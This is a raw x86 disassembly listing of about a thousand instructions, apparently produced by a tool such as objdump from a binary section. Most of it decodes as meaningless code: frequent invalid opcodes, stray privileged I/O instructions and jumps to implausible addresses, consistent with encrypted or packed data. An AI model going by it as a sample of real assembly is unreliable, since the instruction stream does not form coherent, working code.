  413c7f:	mov    dh,0x4a
  413c81:	das    
  413c82:	and    DWORD PTR [eax],esi
  413c84:	pop    es
  413c85:	mov    ch,0xfe
  413c87:	rol    BYTE PTR [edx-0xe],1
  413c8a:	jne    0x413c19
  413c8c:	gs cmp al,0xf7
  413c8f:	inc    esp
  413c90:	(bad)  
  413c92:	test   eax,0x16675a9c
  413c97:	sbb    eax,0xdc457f3f
  413c9c:	xor    eax,0xd95ca53d
  413ca1:	addr16 inc edx
  413ca3:	pop    ecx
  413ca4:	in     al,0x96
  413ca6:	jg     0x413c2a
  413ca8:	aas    
  413ca9:	xor    BYTE PTR [edx+0x5b07a8f1],dh
  413caf:	mov    al,ds:0x43d3c999
  413cb4:	daa    
  413cb5:	sahf   
  413cb6:	fadd   st(5),st
  413cb8:	pop    esp
  413cb9:	mov    ebp,0xd4dc3116
  413cbe:	stos   BYTE PTR es:[edi],al
  413cbf:	cmp    al,0xa4
  413cc1:	popa   
  413cc2:	adc    dh,0x7d
  413cc5:	mov    bl,0xcc
  413cc7:	ins    BYTE PTR es:[edi],dx
  413cc8:	ficomp WORD PTR [edx]
  413cca:	mov    dh,BYTE PTR [edx-0x3a955468]
  413cd0:	mov    bh,BYTE PTR [ebx+0x25cc6074]
  413cd6:	addr16 jno 0x413cc8
  413cd9:	not    DWORD PTR ss:[edx+0x27]
  413cdd:	mov    ds:0x6c00fd43,eax
  413ce2:	dec    ebx
  413ce3:	or     eax,0xa13a0e49
  413ce8:	jbe    0x413c81
  413cea:	lahf   
  413ceb:	pushf  
  413cec:	not    BYTE PTR [ebx+0x7959981f]
  413cf2:	outs   dx,BYTE PTR ds:[esi]
  413cf3:	dec    eax
  413cf4:	ja     0x413d56
  413cf6:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  413cf8:	jmp    DWORD PTR [edx-0x50f3bb78]
  413cfe:	lock out 0x4d,al
  413d01:	call   0x87030fcb
  413d06:	not    DWORD PTR [ebx+eax*4-0xe9a3098]
  413d0d:	inc    esi
  413d0e:	scas   al,BYTE PTR es:[edi]
  413d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d10:	stos   BYTE PTR es:[edi],al
  413d11:	(bad)  
  413d12:	shl    esi,cl
  413d14:	xchg   esp,eax
  413d15:	ja     0x413cd2
  413d17:	fmulp  st(4),st
  413d19:	lds    edx,FWORD PTR [ebx+0x5bcfd679]
  413d1f:	cmp    DWORD PTR [ecx],edi
  413d21:	cmp    DWORD PTR [edx],0xab06573c
  413d27:	mov    dl,0xc4
  413d29:	repz inc esp
  413d2b:	mov    ah,0xb
  413d2d:	mov    DWORD PTR [edx-0x12],eax
  413d30:	sbb    eax,DWORD PTR [eax]
  413d32:	sbb    esi,DWORD PTR [ebx+0x7ec44cb4]
  413d38:	push   edx
  413d39:	sbb    ch,bl
  413d3b:	sar    al,0x94
  413d3e:	xchg   si,ax
  413d40:	ret    0x4626
  413d43:	lahf   
  413d44:	mov    ah,0x2c
  413d46:	push   edx
  413d47:	pop    es
  413d48:	xor    eax,0xfc4ce1a2
  413d4d:	mov    edi,0x66ed15b3
  413d52:	das    
  413d53:	aad    0x91
  413d55:	inc    ebp
  413d56:	xor    DWORD PTR [edx],esi
  413d58:	rcl    BYTE PTR [eax],0x25
  413d5b:	sbb    BYTE PTR [ebx],bh
  413d5d:	dec    ebx
  413d5e:	enter  0xac13,0x7d
  413d62:	(bad)  
  413d63:	lds    ebp,FWORD PTR [edx-0x7a]
  413d66:	inc    edi
  413d67:	jo     0x413d30
  413d69:	jae    0x413de7
  413d6b:	shl    BYTE PTR [ebx-0x234770fe],1
  413d71:	xor    bh,bh
  413d73:	mov    BYTE PTR ds:0xb6e4136a,0x7e
  413d7a:	daa    
  413d7b:	mov    ah,0x6a
  413d7d:	inc    ecx
  413d7e:	push   cs
  413d7f:	xchg   esi,ebp
  413d81:	aam    0xc0
  413d83:	push   ds
  413d84:	(bad)  
  413d85:	adc    bh,cl
  413d87:	outs   dx,DWORD PTR ds:[esi]
  413d88:	or     DWORD PTR [ebx+ebx*1-0x35],ebp
  413d8c:	lds    eax,FWORD PTR [eax]
  413d8e:	pop    ecx
  413d8f:	test   ch,bh
  413d91:	add    cl,ch
  413d93:	dec    ecx
  413d94:	pusha  
  413d95:	test   eax,0xb74cd384
  413d9a:	les    ebx,FWORD PTR ds:0x5249
  413d9f:	(bad)  
  413da0:	mov    edi,0xab527616
  413da5:	mov    DWORD PTR [esi+0x25],edx
  413da8:	sbb    al,0xdf
  413daa:	pop    ds
  413dab:	shr    DWORD PTR [ecx-0x47],1
  413dae:	cmp    ebx,esp
  413db0:	(bad)  
  413db1:	fsub   st,st(0)
  413db3:	es in  eax,dx
  413db5:	xor    eax,0xa2ae60e7
  413dba:	test   DWORD PTR [ebp+0x7e],eax
  413dbd:	ror    DWORD PTR ds:0x79ed9c71,cl
  413dc3:	imul   esp,DWORD PTR [ecx],0x50
  413dc6:	sti    
  413dc7:	(bad)  
  413dc8:	out    0x16,al
  413dca:	adc    ch,BYTE PTR [ebx]
  413dcc:	push   edx
  413dce:	out    dx,al
  413dcf:	mov    ebx,0x64925662
  413dd4:	sahf   
  413dd5:	(bad)  
  413dd6:	push   cs
  413dd7:	jns    0x413e2e
  413dd9:	jl     0x413e57
  413ddb:	aad    0x93
  413ddd:	stc    
  413dde:	scas   eax,DWORD PTR es:[edi]
  413ddf:	mov    ch,BYTE PTR [eax+0x76]
  413de2:	aas    
  413de3:	(bad)  
  413de4:	cmp    eax,0xf8a4f0a
  413de9:	xchg   esp,eax
  413dea:	and    eax,0xe6e46242
  413def:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413df0:	push   si
  413df2:	adc    bh,BYTE PTR [edx-0x32853742]
  413df8:	js     0x413d81
  413dfa:	daa    
  413dfb:	ret    
  413dfc:	adc    eax,0xfcda3aa0
  413e01:	inc    eax
  413e02:	jmp    0x413e4f
  413e04:	mov    eax,0x8c90c1bc
  413e09:	add    edx,esi
  413e0b:	xchg   ebx,eax
  413e0c:	push   cs
  413e0d:	(bad)  [edx]
  413e0f:	lds    eax,FWORD PTR [ebx]
  413e11:	loopne 0x413de0
  413e13:	je     0x413e61
  413e15:	sbb    cl,0xd9
  413e18:	jmp    0xcfbabb1a
  413e1d:	sbb    al,0x86
  413e1f:	pusha  
  413e20:	fs dec esi
  413e22:	pop    DWORD PTR [edx-0xe918c60]
  413e28:	cmc    
  413e29:	fs or  eax,0xc46ff4df
  413e2f:	das    
  413e30:	(bad)  
  413e31:	cmp    al,0x1
  413e33:	xchg   esi,eax
  413e34:	jmp    0x2fec050f
  413e39:	sbb    eax,0x8bfb3edc
  413e3e:	into   
  413e3f:	sti    
  413e40:	lds    esi,FWORD PTR [edx]
  413e42:	push   es
  413e43:	mov    dh,0x5e
  413e45:	lea    esi,[esi]
  413e47:	outs   dx,BYTE PTR ds:[esi]
  413e48:	pop    ds
  413e49:	mov    cs:0x7e5ebce6,al
  413e4f:	in     al,0xeb
  413e51:	into   
  413e52:	cdq    
  413e53:	fbld   TBYTE PTR [ebp+ebp*8-0x6a]
  413e57:	mov    esi,0x1104b19c
  413e5c:	or     DWORD PTR [edx+0x2663302c],eax
  413e62:	hlt    
  413e63:	out    0x89,eax
  413e65:	add    ebx,edi
  413e67:	retf   0xea19
  413e6a:	sbb    BYTE PTR [edx-0x3b],0xcc
  413e6e:	in     al,dx
  413e6f:	xchg   DWORD PTR [edi+esi*8-0x73],eax
  413e73:	jmp    0x413edb
  413e75:	xor    edi,DWORD PTR [ebx]
  413e77:	in     al,0x66
  413e79:	push   esp
  413e7a:	pop    edi
  413e7b:	push   eax
  413e7c:	fimul  DWORD PTR [esi+ebp*1]
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	aad    0x47
  413e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e83:	out    0x31,al
  413e85:	add    DWORD PTR [esi-0x11],ebx
  413e88:	in     eax,0x43
  413e8a:	inc    esp
  413e8b:	or     eax,0x1bddf76c
  413e90:	fwait
  413e91:	mov    bh,BYTE PTR [edi+0x3c]
  413e94:	arpl   WORD PTR [eax+0x37],si
  413e97:	fdivr  st,st(7)
  413e99:	inc    ecx
  413e9a:	push   edi
  413e9b:	or     al,0xdb
  413e9d:	push   esp
  413e9e:	pop    ebx
  413e9f:	pop    edi
  413ea0:	imul   edi,ebx
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	adc    al,0xcb
  413eb9:	scas   eax,DWORD PTR es:[edi]
  413eba:	dec    esi
  413ebb:	out    dx,eax
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	jp     0x413f13
  413ec5:	inc    bl
  413ec7:	mov    eax,ds:0xfc803997
  413ecc:	je     0x413ef0
  413ece:	sub    DWORD PTR [ecx-0x16],esp
  413ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ed2:	clc    
  413ed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ed4:	jb     0x413e5f
  413ed6:	xor    DWORD PTR [ebx+0x6bf55e91],ebp
  413edc:	jl     0x413eaa
  413ede:	fcomip st,st(7)
  413ee0:	pop    ds
  413ee1:	les    esp,FWORD PTR [edi-0xee373e2]
  413ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ee8:	or     DWORD PTR [esi+0xe],edx
  413eeb:	dec    edx
  413eec:	xchg   edx,eax
  413eed:	add    ebx,DWORD PTR [eax+0x1b]
  413ef0:	jmp    0x413ee8
  413ef2:	lock test DWORD PTR [edi-0xc68fd5d],eax
  413ef9:	sub    eax,0xc5b6654
  413efe:	imul   edx,DWORD PTR [eax],0xd942aa32
  413f04:	jl     0x413ebe
  413f06:	pop    ebx
  413f07:	adc    edi,DWORD PTR [eax+0x2a]
  413f0a:	ret    
  413f0b:	(bad)  
  413f0c:	jl     0x413f4d
  413f0e:	xchg   ebp,eax
  413f0f:	fdiv   QWORD PTR [ecx+edx*8+0x6aed7172]
  413f16:	js     0x413f83
  413f18:	(bad)  
  413f1a:	jg     0x413f67
  413f1c:	fnstenv [ebp-0x6636d873]
  413f22:	cld    
  413f23:	lock fmul QWORD PTR [edi-0x1e]
  413f27:	pop    edi
  413f28:	add    eax,0x229e3284
  413f2d:	jb     0x413f94
  413f2f:	pop    ebp
  413f30:	popa   
  413f31:	es out 0xee,al
  413f34:	dec    eax
  413f35:	add    DWORD PTR [ebx],0x67
  413f38:	sub    BYTE PTR [ebp+0x1de24763],cl
  413f3e:	in     eax,dx
  413f3f:	jb     0x413f31
  413f41:	sbb    ebx,DWORD PTR ds:0x335ce65b
  413f47:	xchg   ebp,eax
  413f48:	test   al,0xf8
  413f4a:	out    dx,al
  413f4b:	aaa    
  413f4c:	jl     0x413f9e
  413f4e:	jmp    0x687d8842
  413f53:	test   bh,dl
  413f55:	or     al,0x1c
  413f57:	jne    0x413fd2
  413f59:	adc    eax,0x21dae059
  413f5e:	sbb    bl,BYTE PTR [ebp+0x74]
  413f61:	cmp    cl,ch
  413f63:	stos   DWORD PTR es:[edi],eax
  413f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f65:	jb     0x413f44
  413f67:	adc    dh,bh
  413f69:	cdq    
  413f6a:	cmp    ch,dh
  413f6c:	cmp    ah,BYTE PTR [esi-0x78122f8e]
  413f72:	arpl   WORD PTR [esi+0x45],dx
  413f75:	dec    edx
  413f76:	enter  0xbc51,0x25
  413f7a:	fs popf 
  413f7c:	xchg   DWORD PTR [edi+0x5842ee35],eax
  413f82:	daa    
  413f83:	adc    DWORD PTR [eax+0xdffbb67],ebx
  413f89:	xchg   edx,eax
  413f8a:	outs   dx,DWORD PTR ds:[esi]
  413f8b:	nop
  413f8c:	mov    ah,0x70
  413f8e:	mov    cl,0xf3
  413f90:	nop
  413f91:	mov    al,0x8f
  413f93:	push   esp
  413f94:	(bad)  
  413f95:	jg     0x2b906907
  413f9b:	xor    eax,0x9cb15156
  413fa0:	pop    edi
  413fa1:	cld    
  413fa2:	mov    al,0x71
  413fa4:	(bad)  
  413fa6:	hlt    
  413fa7:	out    dx,al
  413fa8:	mov    esi,ebx
  413faa:	cmp    eax,0x2c680a3a
  413faf:	loopne 0x413f56
  413fb1:	mov    edi,0x5fc42a8c
  413fb6:	push   eax
  413fb7:	xlat   BYTE PTR ds:[ebx]
  413fb8:	arpl   WORD PTR [ecx],bp
  413fba:	inc    ebp
  413fbb:	and    eax,0x3175b1b1
  413fc0:	fidiv  DWORD PTR [ebp+0x5f]
  413fc3:	xchg   eax,ebx
  413fc5:	adc    ah,ah
  413fc7:	xor    dh,BYTE PTR [ebx-0x82def15]
  413fcd:	dec    esi
  413fce:	sub    ecx,DWORD PTR [esp+eax*1+0x5]
  413fd2:	adc    DWORD PTR [edi],eax
  413fd4:	fidiv  WORD PTR [ebx+0x5997daba]
  413fda:	dec    ebp
  413fdb:	jmp    0x414010
  413fdd:	sub    bl,BYTE PTR [esp+esi*8+0x1784a377]
  413fe4:	adc    eax,0x4451dc4f
  413fe9:	fucomi st,st(6)
  413feb:	dec    edi
  413fec:	inc    edx
  413fed:	and    ebp,DWORD PTR es:[ecx]
  413ff0:	dec    esi
  413ff1:	les    edx,FWORD PTR [eax-0x5e]
  413ff4:	in     eax,0x18
  413ff6:	push   ebp
  413ff7:	push   ss
  413ff8:	cs cli 
  413ffa:	pusha  
  413ffb:	inc    eax
  413ffc:	dec    ebp
  413ffd:	fsub   DWORD PTR [ecx-0x1dda8ec4]
  414003:	push   edi
  414004:	push   cs
  414005:	fs or  eax,0x883f4f90
  41400b:	popf   
  41400c:	inc    eax
  41400d:	imul   esi,ebx,0x106d6579
  414013:	cmp    al,0xbb
  414015:	(bad)  
  414016:	jmp    0x25ad038f
  41401b:	inc    ebx
  41401c:	sub    DWORD PTR [ebx+ecx*4+0x40],ebp
  414020:	std    
  414021:	pop    esp
  414022:	rcl    bl,0x42
  414025:	pop    edi
  414026:	scas   al,BYTE PTR es:[edi]
  414027:	push   cs
  414028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414029:	mov    ebp,esi
  41402b:	xchg   esi,eax
  41402c:	mov    ebp,0xf0e98476
  414031:	pop    es
  414032:	xlat   BYTE PTR ds:[ebx]
  414033:	sub    cl,BYTE PTR [edx]
  414035:	nop
  414036:	sar    BYTE PTR [ebx+0x23a0de06],cl
  41403c:	xchg   edx,eax
  41403d:	add    al,0x3a
  41403f:	fisubr WORD PTR [esi+eiz*2-0x127bcd20]
  414046:	dec    ecx
  414047:	dec    eax
  414048:	jl     0x414077
  41404a:	popa   
  41404b:	lock adc ch,ah
  41404e:	lahf   
  41404f:	jg     0x414090
  414051:	or     al,0x93
  414053:	pop    ecx
  414054:	rcl    BYTE PTR [ecx+0x6ca845c1],0xd
  41405b:	xchg   esi,eax
  41405c:	sahf   
  41405d:	out    dx,eax
  41405e:	ret    0x7d5a
  414061:	js     0x4140ab
  414063:	and    al,0x57
  414065:	iret   
  414066:	std    
  414067:	inc    ebp
  414068:	addr16 out 0xc7,al
  41406b:	inc    ecx
  41406c:	enter  0x935c,0x91
  414070:	sbb    al,0x7c
  414072:	and    al,0x47
  414074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414075:	sbb    DWORD PTR [edi-0x71efd199],esi
  41407b:	jns    0x4140f0
  41407d:	adc    BYTE PTR [ecx+ebx*8-0x22],cl
  414081:	jl     0x41401c
  414083:	push   eax
  414084:	rcr    BYTE PTR [ebp-0x4],0xb6
  414088:	pop    ebp
  414089:	add    bh,cl
  41408b:	cmp    al,0xcc
  41408d:	fs mov ebp,0x9443c5dd
  414093:	popa   
  414094:	mov    ah,0xff
  414096:	ja     0x41401c
  414098:	ror    bh,0x54
  41409b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41409c:	ss inc ebx
  41409e:	inc    ecx
  41409f:	sbb    ecx,DWORD PTR [esi+0x63]
  4140a2:	ins    BYTE PTR es:[edi],dx
  4140a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140a4:	popa   
  4140a5:	push   ebp
  4140a6:	mov    esi,gs
  4140a8:	dec    edi
  4140a9:	lods   eax,DWORD PTR ds:[esi]
  4140aa:	lock mov bh,0x7a
  4140ad:	add    edx,eax
  4140af:	call   0xf62ef8cc
  4140b4:	je     0x4140ed
  4140b6:	mov    esi,0x7a5e4f7a
  4140bb:	pop    eax
  4140bc:	icebp  
  4140bd:	xchg   ebp,eax
  4140be:	out    dx,eax
  4140bf:	dec    ebx
  4140c0:	lock push esp
  4140c2:	push   ebp
  4140c3:	cmp    DWORD PTR [esi-0x7c],ecx
  4140c6:	or     BYTE PTR [ebp+0x56],al
  4140c9:	stos   DWORD PTR es:[edi],eax
  4140ca:	fwait
  4140cb:	or     al,0x47
  4140cd:	and    esp,DWORD PTR [esi+ecx*1-0x2e77c039]
  4140d4:	es sahf 
  4140d6:	pop    ebx
  4140d7:	cmp    eax,0xbe2c135f
  4140dc:	mov    bh,0x9f
  4140de:	jmp    0x4140ce
  4140e0:	repz inc ecx
  4140e2:	imul   ebx
  4140e4:	add    al,0x94
  4140e6:	mov    dl,0x98
  4140e8:	jp     0x4140e8
  4140ea:	pop    esp
  4140eb:	fstp   TBYTE PTR [ecx+eiz*1+0x21]
  4140ef:	mov    ss,WORD PTR [eax-0x74ff83a5]
  4140f5:	popf   
  4140f6:	int    0xe7
  4140f8:	sbb    bl,BYTE PTR ds:0x235a8b57
  4140fe:	leave  
  4140ff:	add    al,0x86
  414101:	cdq    
  414102:	hlt    
  414103:	jnp    0x41417a
  414105:	mov    edi,0x79cbf96d
  41410a:	and    BYTE PTR [ebx+0x6243214],bh
  414110:	int    0xd
  414112:	bnd jae 0x4140c6
  414115:	jne    0x4140e4
  414117:	and    eax,DWORD PTR ds:0xa525b2a1
  41411d:	test   al,0x36
  41411f:	mov    bl,al
  414121:	stos   BYTE PTR es:[edi],al
  414122:	fscale 
  414124:	fs (bad) 
  414127:	ins    DWORD PTR es:[edi],dx
  414128:	add    eax,0x9248d67d
  41412d:	pop    edx
  41412e:	xor    ebx,eax
  414130:	jmp    0x4143b8
  414135:	les    edi,FWORD PTR [edi]
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0x20145a14
  414142:	leave  
  414143:	outs   dx,BYTE PTR ds:[esi]
  414144:	add    al,0x54
  414146:	add    al,0x7f
  414148:	js     0x41412f
  41414a:	jle    0x4141c4
  41414c:	js     0x4141b0
  41414e:	mov    al,ds:0x2253f706
  414153:	jne    0x4140e5
  414155:	sub    BYTE PTR [esi],cl
  414157:	stos   BYTE PTR es:[edi],al
  414158:	push   edi
  414159:	push   cs
  41415a:	inc    ecx
  41415b:	cwde   
  41415c:	pushf  
  41415d:	or     ecx,DWORD PTR [eax]
  41415f:	jno    0x4141d1
  414161:	imul   ebp,ebp,0xffffff90
  414164:	inc    esi
  414165:	sahf   
  414166:	js     0x4141de
  414168:	call   0x1afe58e9
  41416d:	arpl   WORD PTR [esi+0x7df66a18],bx
  414173:	jbe    0x414177
  414175:	rol    BYTE PTR [edx-0x560225d3],cl
  41417b:	or     esi,esi
  41417d:	inc    edi
  41417e:	mov    ecx,0x3a481935
  414183:	and    al,BYTE PTR [ebp-0x7df4476]
  414189:	pop    ecx
  41418a:	test   eax,0xcae2266f
  41418f:	xor    esi,DWORD PTR [edi+0x74c85a5b]
  414195:	fwait
  414196:	xchg   ebp,eax
  414197:	pop    edx
  414198:	mov    eax,ds:0xcff83799
  41419d:	add    DWORD PTR [eax-0x4d5c154],edx
  4141a3:	jle    0x41417e
  4141a5:	jg     0x4141b8
  4141a7:	call   0x4c65b009
  4141ac:	lds    esi,FWORD PTR [eax]
  4141ae:	push   edx
  4141af:	sbb    eax,0x60815785
  4141b4:	or     edi,DWORD PTR [edx+0x208c1949]
  4141ba:	ret    0x2c16
  4141bd:	fwait
  4141be:	mov    ebx,0x5a897790
  4141c3:	daa    
  4141c4:	mov    eax,0x71dd8124
  4141c9:	mov    ebp,0xcd30c473
  4141ce:	cdq    
  4141cf:	mov    ebx,0xea61026a
  4141d4:	test   eax,0xfff2f1a8
  4141d9:	(bad)  
  4141db:	fwait
  4141dc:	sar    DWORD PTR [ebp-0x109b0569],cl
  4141e2:	out    dx,al
  4141e3:	fs test eax,0xbb18d061
  4141e9:	(bad)  
  4141ea:	jno    0x414173
  4141ec:	dec    esi
  4141ed:	pop    ds
  4141ee:	or     BYTE PTR [edx+0x4f814885],dh
  4141f4:	sbb    BYTE PTR [edx+0x7e],ah
  4141f7:	jnp    0x41425f
  4141f9:	and    eax,0x970678b2
  4141fe:	jge    0x4141f2
  414200:	push   ecx
  414201:	pop    ecx
  414202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414203:	dec    edx
  414204:	stc    
  414205:	iret   
  414206:	jecxz  0x4141a3
  414208:	pop    eax
  414209:	stos   DWORD PTR es:[edi],eax
  41420a:	fnstcw WORD PTR [edi+0x4b020f2f]
  414210:	and    cl,bh
  414212:	retf   
  414213:	sti    
  414214:	cdq    
  414215:	xor    dl,BYTE PTR [ebp+0x650c73a]
  41421b:	add    BYTE PTR [ecx-0x52950b49],0x4a
  414222:	jae    0x4141c3
  414224:	aad    0xc1
  414226:	test   BYTE PTR [ebx],0x23
  414229:	stos   DWORD PTR es:[edi],eax
  41422a:	mov    esi,0x56a1720d
  41422f:	rcl    bh,1
  414231:	add    eax,0xe37577c
  414236:	pop    ds
  414237:	mov    bh,0x18
  414239:	imul   esi,DWORD PTR [ebx+edi*4-0x2b],0xdd9d0734
  414241:	adc    bh,BYTE PTR [ebp-0x2686d576]
  414247:	addr16 mov ch,0x93
  41424a:	int3   
  41424b:	mov    esp,0xa56f6ce9
  414250:	or     esp,DWORD PTR [ecx+0x6f]
  414253:	jmp    0xba62:0xc029db4
  41425a:	and    esp,0x63
  41425d:	mov    dl,0x9
  41425f:	popf   
  414260:	div    BYTE PTR [esi]
  414262:	mov    eax,0xa48313e9
  414267:	mov    eax,0x887d4093
  41426c:	fidivr DWORD PTR [esi-0x70b8a671]
  414272:	push   ebx
  414273:	or     BYTE PTR [ebx-0x47be1486],0x6f
  41427a:	push   esp
  41427b:	xchg   esp,eax
  41427c:	pop    esi
  41427d:	ss iret 
  41427f:	mov    dh,0x80
  414281:	cmp    eax,0xf0ffa945
  414286:	jbe    0x4142de
  414288:	xchg   esp,eax
  414289:	mov    edx,edx
  41428b:	outs   dx,DWORD PTR ds:[esi]
  41428c:	sbb    DWORD PTR [esi+0x451c7e8c],esi
  414292:	jae    0x414257
  414294:	push   0xa0c5449b
  414299:	out    0x39,al
  41429b:	rcl    BYTE PTR [esi],0x34
  41429e:	xor    edi,ecx
  4142a0:	add    eax,DWORD PTR [edi+0x7a]
  4142a3:	das    
  4142a4:	sti    
  4142a5:	pop    DWORD PTR [eax+0x3c7c74c9]
  4142ab:	ins    BYTE PTR es:[edi],dx
  4142ac:	push   cs
  4142ad:	div    DWORD PTR [ebx-0x630583fd]
  4142b3:	mov    ch,0x1b
  4142b5:	test   eax,0x7c5bf170
  4142ba:	test   eax,0xaf07c3e5
  4142bf:	jae    0x4142d9
  4142c1:	out    0x1d,al
  4142c3:	call   0xa8f8c79e
  4142c8:	sub    DWORD PTR [ebx],edx
  4142ca:	mov    dh,BYTE PTR [ebp+0x28]
  4142cd:	mov    eax,ds:0xc100855d
  4142d2:	ror    BYTE PTR [edi+0x38ed47f9],cl
  4142d8:	push   0xffffffeb
  4142da:	mul    DWORD PTR [esi+0x5f]
  4142dd:	fxam   
  4142df:	shl    BYTE PTR [edx+0x4f419fa4],0x63
  4142e6:	cwde   
  4142e7:	pop    ds
  4142e8:	fldenv [ebx]
  4142ea:	mov    ch,0xaf
  4142ec:	inc    esp
  4142ed:	ret    0xd390
  4142f0:	xchg   BYTE PTR [ebp-0x14],al
  4142f3:	push   esp
  4142f4:	shl    BYTE PTR [ebx+0x78cd5e1a],1
  4142fa:	add    edi,DWORD PTR [eax]
  4142fc:	push   esp
  4142fd:	stos   BYTE PTR es:[edi],al
  4142fe:	add    ebx,0xd09434c7
  414304:	add    esp,edx
  414306:	xchg   esp,eax
  414307:	daa    
  414308:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414309:	nop
  41430a:	test   eax,0xfe9c8814
  41430f:	int3   
  414310:	sbb    ebx,esi
  414312:	and    BYTE PTR [ebx-0x6c],bl
  414315:	ficom  WORD PTR [edi+0x1d]
  414318:	lock por mm0,QWORD PTR [ecx]
  41431c:	lock fstp DWORD PTR [ebx+0x66e975c8]
  414323:	mov    esi,0xc5933271
  414328:	mov    ecx,0x49ab7447
  41432d:	mov    edi,0x3b97be3b
  414332:	out    dx,al
  414333:	ins    BYTE PTR es:[edi],dx
  414334:	fnsave [ecx-0x1a]
  414337:	pop    esi
  414338:	cwde   
  414339:	xor    DWORD PTR [esi+0x6d982afe],ecx
  41433f:	fcmovnb st,st(5)
  414341:	std    
  414342:	popa   
  414343:	test   eax,0x46c33211
  414348:	xor    eax,0x14906a56
  41434d:	xlat   BYTE PTR ds:[ebx]
  41434e:	push   cs
  41434f:	pop    ds
  414350:	mov    ecx,0x3b843235
  414355:	in     al,0xcd
  414357:	sbb    edx,DWORD PTR [eiz*2+0x122d2b4b]
  41435e:	sub    esp,DWORD PTR [ecx+0x2a0b9dc9]
  414364:	cmp    DWORD PTR [eax],eax
  414366:	(bad)  
  414367:	aad    0xc0
  414369:	hlt    
  41436a:	icebp  
  41436b:	inc    edx
  41436c:	mov    ah,BYTE PTR [edi+0x60]
  41436f:	dec    esp
  414370:	or     ebx,DWORD PTR ss:[esi]
  414373:	adc    BYTE PTR [esi],al
  414375:	leave  
  414376:	lock xchg esi,eax
  414378:	loopne 0x41430a
  41437a:	mov    ds:0x31b685b2,eax
  41437f:	ins    DWORD PTR es:[edi],dx
  414380:	out    dx,eax
  414381:	push   0xccd55c33
  414386:	sub    dl,0x9c
  414389:	mov    DWORD PTR [ebx],esp
  41438b:	popa   
  41438c:	xlat   BYTE PTR ds:[ebx]
  41438d:	mov    eax,0xc0e86fdc
  414392:	xchg   DWORD PTR [ebp-0x65],esi
  414395:	pop    esi
  414396:	add    DWORD PTR [eax+0x2d],esi
  414399:	push   eax
  41439a:	xchg   edi,eax
  41439b:	inc    ebp
  41439c:	leave  
  41439d:	in     al,dx
  41439e:	pop    ebx
  41439f:	adc    al,0x40
  4143a1:	ds jecxz 0x41438e
  4143a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143a5:	repnz dec esp
  4143a7:	or     eax,DWORD PTR ds:0x421af096
  4143ad:	push   ebp
  4143ae:	cdq    
  4143af:	retf   
  4143b0:	push   esi
  4143b1:	push   0xfffffffa
  4143b3:	enter  0x2071,0xe9
  4143b7:	jmp    0x4143e4
  4143b9:	ror    DWORD PTR [ebp+0x72981fbc],1
  4143bf:	xor    al,BYTE PTR [eax]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	imul   ebp,DWORD PTR [ebx+0x22],0x7f09c1db
  4143eb:	js     0x4143d2
  4143ed:	jle    0x414467
  4143ef:	js     0x414441
  4143f1:	fisttp WORD PTR [edx+0x77f8b72c]
  4143f7:	stos   BYTE PTR es:[edi],al
  4143f8:	mov    ds:0xeff325d5,eax
  4143fd:	inc    edi
  4143fe:	push   esp
  4143ff:	(bad)  
  414400:	xor    al,0x26
  414402:	adc    DWORD PTR [ebp+0x38f1c380],edi
  414408:	pushf  
  414409:	add    DWORD PTR ds:0xbeabf9b7,ebx
  41440f:	ret    0xf6d3
  414412:	xchg   edx,eax
  414413:	or     DWORD PTR [esi],ecx
  414415:	jecxz  0x4143ca
  414417:	ins    DWORD PTR es:[edi],dx
  414418:	push   0xffffffd0
  41441a:	push   edi
  41441b:	lahf   
  41441c:	js     0x41446e
  41441e:	mov    ds:0x74f246b5,al
  414423:	gs ins BYTE PTR es:[edi],dx
  414425:	lods   eax,DWORD PTR ds:[esi]
  414426:	xchg   esi,eax
  414427:	mov    ebp,DWORD PTR [edi+0x782889b1]
  41442d:	mov    BYTE PTR [eax],0xad
  414430:	cmp    esp,DWORD PTR [edx+esi*1-0x1ecf35e7]
  414437:	cs loop 0x414410
  41443a:	inc    ecx
  41443b:	jmp    0x33e658d8
  414440:	cmp    al,bh
  414442:	push   0x4efde7e0
  414447:	daa    
  414448:	pcmpgtb mm0,QWORD PTR [edx]
  41444b:	or     eax,0xb2ce310e
  414450:	cmp    eax,0xa219538d
  414455:	and    DWORD PTR [eax-0x707c00bf],0xe6015c8b
  41445f:	xchg   DWORD PTR [ebx-0x43],esi
  414462:	das    
  414463:	mov    ch,0x75
  414465:	idiv   DWORD PTR [edx+esi*8+0x5ed0f692]
  41446c:	mov    dl,BYTE PTR [esi]
  41446e:	mov    ebp,0xf92f6c08
  414473:	dec    esp
